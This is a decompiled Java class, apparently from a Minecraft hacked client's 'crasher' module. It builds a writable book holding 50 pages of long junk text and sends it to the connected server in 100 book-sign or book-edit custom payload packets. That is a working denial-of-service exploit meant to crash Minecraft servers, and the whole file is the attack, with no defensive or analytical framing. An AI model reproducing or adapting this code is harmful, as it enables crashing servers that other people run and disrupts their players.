// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.opc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import java.util.Random;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class OnePacketCrasher8
{
    public static void start() {
        final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagCompound bookCompound = new NBTTagCompound();
        bookCompound.setString("author", "huhehe" + new Random().nextInt(20));
        bookCompound.setString("title", "boys" + new Random().nextInt(20));
        final NBTTagList pageList = new NBTTagList();
        final String pageText = "34vyncr789c34hv34nryvb478rhn3c4x89nr3cvbhy3478rn34cv8934bcrgh348rj3cvb3478crv34hr34cvr7b34crv78btruigvhrnureyeuroicnhoeumnyvt34vyncr789c34hv34nryvb478rhn3c4x89nr3cvbhy3478rn34cv8934bcrgh348rj3cvb3478crv34hr34cvr7b34crv78btruigvhrnureyeuroicnhoeumnyvt34vyncr789c34hv34nryvb478rhn3c4x89nr3cvbhy3478rn34cv8934bcrgh348rj3cvb3478crv34hr34cvr7b34crv78btruigvhrnureyeuroicnhoeumnyvt34vyncr789c34hv34nryvb478rhn3c4x89nr3cvbhy3478rn34cv8934bcrgh348rj3cvb3478crv34hr34cvr7b34crv78btruigvhrnureyeuroicnhoeumnyvt34vyncr789c34hv34nryvb478rhn3c4x89nr3cvbhy3478rn34cv8934bcrgh348rj3cvb3478crv34hr34cvr7b34crv78btruigvhrnureyeuroicnhoeumnyvt34vyncr789c34hv34nryvb478rhn3c4x89nr3cvbhy3478rn34cv8934bcrgh348rj3cvb3478crv34hr34cvr7b34crv78btruigvhrnureyeuroicnhoeumnyvt";
        for (int page = 0; page < 50; ++page) {
            pageList.appendTag(new NBTTagString(pageText));
        }
        bookCompound.setTag("pages", pageList);
        bookStack.setTagCompound(bookCompound);
        for (int packets = 0; packets < 100; ++packets) {
            final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStackToBuffer(bookStack);
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
        }
    }
}
